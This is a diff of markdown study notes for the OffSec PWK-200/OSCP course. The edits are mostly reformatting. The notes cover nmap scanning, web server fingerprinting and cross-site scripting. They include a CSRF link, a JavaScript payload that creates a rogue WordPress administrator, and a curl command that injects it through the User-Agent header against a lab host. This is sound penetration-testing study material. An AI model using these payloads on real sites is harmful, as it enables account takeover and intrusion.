@@ -157,7 +157,7 @@
 - `/etc/passwd`, `/etc/shadow`, SAM
 - History files and config files
 - Scripts or backups with credentials
-- 
+  
 ## PWK-200 syallabus
 ### 6. Information gathering  
    **Passive**
@@ -291,7 +291,7 @@
      - `sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124`: provide vuln name, target, port > additional vulnerability
        
 ### 8. Introduction to web applcation attacks
-   - Fingerprinting Web Servers with Nmap
+   - **Fingerprinting Web Servers** with Nmap
      `sudo nmap -p80 -sV 192.168.50.20`: grab the web server banner
      `sudo nmap -p80 --script=http-enum 192.168.50.20`: NSE enum web server (pages discovery)
    - [Wappalyzer](https://www.wappalyzer.com/): technology stack
@@ -328,24 +328,24 @@
       -d '{"password": "pwned"}'
       ```
 
-    - Cross-site scripting  
-      - reflected: payload in a crafted request or link. search field or user input included in error messages. 
-      - stored/persistent: exploit payload is stored in a database. web application then retrieves this payload and displays it to anyone who visits a vulnerable page. forum comment, product review.  
-      - DOM-based: page’s DOM is modified with user-controlled values  
-      - identify XSS: input accepts unsanitized input `< > ' " { } ;`. URL encoding (space-%20) & HTML encoding (\-&lt;) interprete as code  
-      - User-Agent `<script>alert(1)</script>`  
-      - privilege escalation: steal cookies. protection (secure-send cookier over https.httpOnly-deny js access to cookies). browser tool 'Storage>Cookies'  
-      - CSRF: `<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>`  
-      - Create a new WordPress Admin account  
-        - exploit /wp-admin/user-new.php, retrieve nonce value in HTTP response based on the regular expression `var nonceRegex = /ser" value="([^"]*?)"/g;`    
-        ```
-        var params = "action=createuser&_wpnonce_createuser="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
-        ajaxRequest = new XMLHttpRequest();
-        ajaxRequest.open("POST", requestURL, true);
-        ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        ajaxRequest.send(params);
-        ```
-        - minify attack code into a one-liner via [JS Compress](https://jscompress.com/). Encode the minified Javascript code  
+  - **Cross-site scripting**  
+     - reflected: payload in a crafted request or link. search field or user input included in error messages. 
+     - stored/persistent: exploit payload is stored in a database. web application then retrieves this payload and displays it to anyone who visits a vulnerable page. forum comment, product review.  
+     - DOM-based: page’s DOM is modified with user-controlled values  
+     - identify XSS: input accepts unsanitized input `< > ' " { } ;`. URL encoding (space-%20) & HTML encoding (\-&lt;) interprete as code  
+     - User-Agent `<script>alert(1)</script>`  
+     - privilege escalation: steal cookies. protection (secure-send cookier over https.httpOnly-deny js access to cookies). browser tool 'Storage>Cookies'  
+     - CSRF: `<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>`  
+     - Create a new WordPress Admin account  
+       - exploit /wp-admin/user-new.php, retrieve nonce value in HTTP response based on the regular expression `var nonceRegex = /ser" value="([^"]*?)"/g;`    
+         ```
+         var params = "action=createuser&_wpnonce_createuser="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+         ajaxRequest = new XMLHttpRequest();
+         ajaxRequest.open("POST", requestURL, true);
+         ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+         ajaxRequest.send(params);
+         ```
+      - minify attack code into a one-liner via [JS Compress](https://jscompress.com/). Encode the minified Javascript code  
         ```
         function encode_to_javascript(string) {
           var input = string
@@ -355,19 +355,19 @@
           if(pos != (input.length - 1)) {
           output += ",";
           }
-          }
-          return output;
-          }
-          let encoded = encode_to_javascript('insert_minified_javascript')
-          console.log(encoded)
+         }
+         return output;
+         }
+         let encoded = encode_to_javascript('insert_minified_javascript')
+         console.log(encoded)
         ```
-        - launch attack on user-agent field  
+      - launch attack on user-agent field  
         ```
         curl -i http://offsecwp --user-agent
         "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,1
         ...))</script>" --proxy 127.0.0.1:8080
         ```  
-        - XSS stored in the WordPress DB. Login WP as admin, then click the visitor plugins
+        XSS stored in the WordPress DB. Login WP as admin, then click the visitor plugins
         
 ### 9. Common Web Application attacks
     - **Directory traversal**: access files outside of the web root by using relative paths (gathering info like credentials or keys that lead to system access)  
